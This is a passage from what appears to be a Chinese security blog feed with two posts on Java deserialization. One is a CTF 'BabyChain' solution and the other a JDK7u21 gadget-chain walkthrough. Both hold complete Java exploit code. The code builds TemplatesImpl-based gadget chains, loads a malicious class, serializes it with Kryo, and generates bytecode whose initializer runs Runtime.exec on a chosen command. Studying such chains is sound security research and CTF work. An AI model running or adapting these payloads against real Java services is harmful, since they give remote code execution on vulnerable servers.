class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.esotericsoftware.kryo.Kryo;</span><br><span class="line"><span class="keyword">import</span> com.esotericsoftware.kryo.io.Output;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> org.objenesis.strategy.StdInstantiatorStrategy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.security.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings(value = &quot;all&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">N1_BabyChain</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c1</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\BadClass\\SpringEvil.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        bytecodesField.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class, templates);</span><br><span class="line"></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        setValue(badAttributeValueExpException,<span class="string">&quot;val&quot;</span>,toStringBean);</span><br><span class="line"></span><br><span class="line">        KeyPairGenerator keyPairGenerator;</span><br><span class="line">        keyPairGenerator = KeyPairGenerator.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        keyPairGenerator.initialize(<span class="number">1024</span>);</span><br><span class="line">        <span class="type">KeyPair</span> <span class="variable">keyPair</span> <span class="operator">=</span> keyPairGenerator.genKeyPair();</span><br><span class="line">        <span class="type">PrivateKey</span> <span class="variable">privateKey</span> <span class="operator">=</span> keyPair.getPrivate();</span><br><span class="line">        <span class="type">Signature</span> <span class="variable">signingEngine</span> <span class="operator">=</span> Signature.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">SignedObject</span> <span class="variable">signedObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SignedObject</span>(badAttributeValueExpException,privateKey,signingEngine);</span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(SignedObject.class, signedObject);</span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">equalsBean2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class, toStringBean2);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap2 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;(<span class="number">1</span>);</span><br><span class="line">        hashMap2.put(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Object[] tables2= (Object[]) getValue(hashMap2,<span class="string">&quot;table&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">new_tables2</span> <span class="operator">=</span> tables2[<span class="number">0</span>];</span><br><span class="line">        setValue(new_tables2,<span class="string">&quot;key&quot;</span>,equalsBean2);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">Kryo</span> <span class="variable">kryo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Kryo</span>();</span><br><span class="line">        kryo.setRegistrationRequired(<span class="literal">false</span>);</span><br><span class="line">        kryo.setInstantiatorStrategy(<span class="keyword">new</span> <span class="title class_">StdInstantiatorStrategy</span>());</span><br><span class="line">        <span class="type">Output</span> <span class="variable">o</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Output</span>(baos);</span><br><span class="line">        kryo.writeClassAndObject(o, hashMap2);</span><br><span class="line">        o.close();</span><br><span class="line">        System.out.println(base64Encode(baos.toByteArray()));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getValue</span><span class="params">(Object obj, String name)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> field.get(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        os.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">oi</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> oi.readObject();</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> object.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object,value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">base64Encode</span><span class="params">(<span class="keyword">final</span> <span class="type">byte</span>[] bytes)</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> Base64.<span class="type">Encoder</span> <span class="variable">encoder</span> <span class="operator">=</span> Base64.getEncoder();</span><br><span class="line">        <span class="keyword">return</span> encoder.encodeToString(bytes);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/ppywq8f"><img src="https://s1.ax1x.com/2023/03/27/ppywq8f.png" alt="ppywq8f.png"></a></p><h2 id="Old-FastJSON"><a href="#Old-FastJSON" class="headerlink" title="Old FastJSON"></a>Old FastJSON</h2><p>æƒ³ç­‰èµ›åå¤ç°çš„ï¼Œç»“æœæ²¡èƒ½æ‰¾åˆ°wpâ€¦æ—¥åè¡¥å……å§</p>]]></content>
      
      
      <categories>
          
          <category> Javaå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> äºŒæ¬¡ååºåˆ—åŒ– </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Javaå®‰å…¨ä¹‹è·¯--JDK7u21é“¾</title>
      <link href="/2023/03/01/JDK7u21%E9%93%BE/"/>
      <url>/2023/03/01/JDK7u21%E9%93%BE/</url>
      
        <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>7u21é“¾åœ¨ä¸éœ€è¦å¼•è¿›ç¬¬ä¸‰æ–¹åº“çš„æƒ…å†µä¸‹, å¯ä»¥åˆ©ç”¨<code>jdk</code>çš„åŸç”Ÿä»£ç å®ç°ååºåˆ—åŒ–æ¼æ´</p><p><code>jdk</code>ç‰ˆæœ¬&lt;&#x3D;<code>7u21</code></p><h2 id="ä¸€ã€ç¯å¢ƒæ­å»º"><a href="#ä¸€ã€ç¯å¢ƒæ­å»º" class="headerlink" title="ä¸€ã€ç¯å¢ƒæ­å»º"></a>ä¸€ã€ç¯å¢ƒæ­å»º</h2><p>1ã€jdk-7u21</p><p>2ã€éœ€è¦å¯¼å…¥<code>javassist</code>ï¼Œä»¥ç”¨äºä¸ºäº†æ–¹ä¾¿ç”Ÿæˆæ¶æ„ç±»çš„å­—èŠ‚ç </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.javassist<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javassist<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.20.0-GA<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="äºŒã€ååºåˆ—åŒ–Gadgets"><a href="#äºŒã€ååºåˆ—åŒ–Gadgets" class="headerlink" title="äºŒã€ååºåˆ—åŒ–Gadgets"></a>äºŒã€ååºåˆ—åŒ–Gadgets</h2><p>ysoé“¾</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">LinkedHashSet.readObject()</span><br><span class="line">  LinkedHashSet.add()</span><br><span class="line">    ...</span><br><span class="line">      TemplatesImpl.hashCode() (X)</span><br><span class="line">  LinkedHashSet.add()</span><br><span class="line">    ...</span><br><span class="line">      Proxy(Templates).hashCode() (X)</span><br><span class="line">        AnnotationInvocationHandler.invoke() (X)</span><br><span class="line">          AnnotationInvocationHandler.hashCodeImpl() (X)</span><br><span class="line">            String.hashCode() (<span class="number">0</span>)</span><br><span class="line">            AnnotationInvocationHandler.memberValueHashCode() (X)</span><br><span class="line">              TemplatesImpl.hashCode() (X)</span><br><span class="line">      Proxy(Templates).equals()</span><br><span class="line">        AnnotationInvocationHandler.invoke()</span><br><span class="line">          AnnotationInvocationHandler.equalsImpl()</span><br><span class="line">            Method.invoke()</span><br><span class="line">              ...</span><br><span class="line">                TemplatesImpl.getOutputProperties()</span><br><span class="line">                  TemplatesImpl.newTransformer()</span><br><span class="line">                    TemplatesImpl.getTransletInstance()</span><br><span class="line">                      TemplatesImpl.defineTransletClasses()</span><br><span class="line">                        ClassLoader.defineClass()</span><br><span class="line">                        Class.newInstance()</span><br><span class="line">                          ...</span><br><span class="line">                            MaliciousClass.&lt;clinit&gt;()</span><br><span class="line">                              ...</span><br><span class="line">                                Runtime.exec()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ ¸å¿ƒåˆ©ç”¨ç‚¹åœ¨<code>AnnotationInvocationHandler</code>ç±»</p><p>åœ¨ä»–çš„invokeæ–¹æ³•ä¸­ï¼Œå¦‚æœä¼ å…¥çš„æ–¹æ³•ä¸º<code>equals</code>ä¸”åªæœ‰ä¸€ä¸ª<code>Object</code>ç±»å‹å½¢å‚çš„æ—¶å€™ï¼Œå°±å¯ä»¥è¿›å…¥<code>equalsImpl()</code>æ–¹æ³•ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object var1, Method var2, Object[] var3)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">var4</span> <span class="operator">=</span> var2.getName();</span><br><span class="line">        Class[] var5 = var2.getParameterTypes();</span><br><span class="line">        <span class="keyword">if</span> (var4.equals(<span class="string">&quot;equals&quot;</span>) &amp;&amp; var5.length == <span class="number">1</span> &amp;&amp; var5[<span class="number">0</span>] == Object.class) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.equalsImpl(var3[<span class="number">0</span>]);</span><br></pre></td></tr></table></figure><p>è·Ÿè¿›equalsImpl</p><p><a href="https://imgse.com/i/ppm73xf"><img src="https://s1.ax1x.com/2023/03/09/ppm73xf.png" alt="ppm73xf.png"></a></p><p>å­˜åœ¨<code>var8 = var5.invoke(var1);</code>è¯­å¥, å¯ä»¥é€šè¿‡åå°„è°ƒç”¨<code>var1</code>å¯¹è±¡çš„<code>var5</code>æ–¹æ³•ï¼Œæ‰€ä»¥<code>var1</code>å¯ä»¥è®¾ç½®ä¸º<code>TemplatesImpl</code>ç±»ï¼Œ<code>var5</code>ä¸º<code>TemplatesImpl</code>ç±»çš„<code>newTransformer</code>æˆ–<code>getTransletInstance</code>æ–¹æ³•ï¼Œè¿™æ ·å°±å¯ä»¥æ‰§è¡Œç±»åŠ è½½æ¶æ„å­—èŠ‚ç ï¼Œä»è€Œæ‰§è¡Œæ¶æ„ä»£ç </p><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡AnnotationInvocationHandleråˆ›å»ºä»»æ„ä¸€ä¸ªä»£ç†å¯¹è±¡ï¼Œç„¶åä»£ç†å¯¹è±¡è°ƒç”¨equalsæ–¹æ³•ä¼ å…¥å‚æ•°ä¸ºæ¶æ„TemplatesImplå¯¹è±¡ï¼Œæ¥è¿›è¡Œæµ‹è¯•</p><p><strong>demo1</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">demo2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c1</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates, <span class="string">&quot;aaaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code = RunCommand(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        bytecodesField.set(templates, codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line">        Constructor&lt;?&gt; c = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">        c.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">invocationHandler</span> <span class="operator">=</span> (InvocationHandler) c.newInstance(Templates.class, map);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">proxy</span> <span class="operator">=</span> Proxy.newProxyInstance(<span class="literal">null</span>, Object.class.getInterfaces(), invocationHandler);</span><br><span class="line">        proxy.equals(templates);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] RunCommand(String cmd) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Evil&quot;</span>);</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">            ctClass.setSuperclass(superClass);</span><br><span class="line">            <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ctClass.makeClassInitializer();</span><br><span class="line">            constructor.setBody(<span class="string">&quot; try &#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd +</span><br><span class="line">                    <span class="string">&quot;\&quot;);\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; &#125; catch (Exception ignored) &#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; &#125;&quot;</span>);</span><br><span class="line">            <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">            ctClass.defrost();</span><br><span class="line">            <span class="keyword">return</span> bytes;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/ppuY4J0"><img src="https://s1.ax1x.com/2023/03/10/ppuY4J0.png" alt="ppuY4J0.png"></a></p><p>è¿™é‡Œè®²ä¸‹var2çš„æ¥å†</p><p>è·Ÿè¿›getMemberMethods</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Method[] getMemberMethods() &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.memberMethods == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="built_in">this</span>.memberMethods = (Method[])AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>&lt;Method[]&gt;() &#123;</span><br><span class="line">            <span class="keyword">public</span> Method[] run() &#123;</span><br><span class="line">                Method[] var1 = AnnotationInvocationHandler.<span class="built_in">this</span>.type.getDeclaredMethods();</span><br><span class="line">                AccessibleObject.setAccessible(var1, <span class="literal">true</span>);</span><br><span class="line">                <span class="keyword">return</span> var1;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œé€šè¿‡åå°„è·å¾—this.typeä¸­çš„æ‰€æœ‰æ–¹æ³•ã€‚è€Œthis.typeæ˜¯åœ¨è¯¥å¯¹è±¡æ„é€ æ–¹æ³•ä¸­ä¼ å…¥çš„ç¬¬ä¸€ä¸ªå‚æ•°ã€‚</p><p>ä½†æ˜¯æƒ³è¦èµ°åˆ°<code>var5.invoke(var1)</code>, éœ€è¦æ»¡è¶³3ä¸ªifåˆ¤æ–­</p><ul><li>var1 !&#x3D; this;</li><li>var1å¯¹è±¡éœ€èƒ½å¤Ÿè½¬åŒ–ä¸º this.type ç±»å‹ï¼Œthis.type åº”è¯¥ä¸º var1 å¯¹åº”ç±»çš„æœ¬ç±»æˆ–çˆ¶ç±»;</li><li>this.asOneOfUs(var1) è¿”å› null.z</li></ul><p>æ¥ä¸‹æ¥å°±æ˜¯å»æ‰¾å“ªé‡Œè°ƒç”¨äº†<code>equals</code></p><p>åœ¨<code>LinkedHashSet</code>ç±»ï¼Œå®ƒç»§æ‰¿äº†<code>HashSet</code>ç±»ï¼ŒåŒæ—¶å®ƒçš„readObjectæ–¹æ³•ä¹Ÿæ˜¯ä»HashSetç»§æ‰¿çš„</p><figure class="highlight java"><table><tr><td 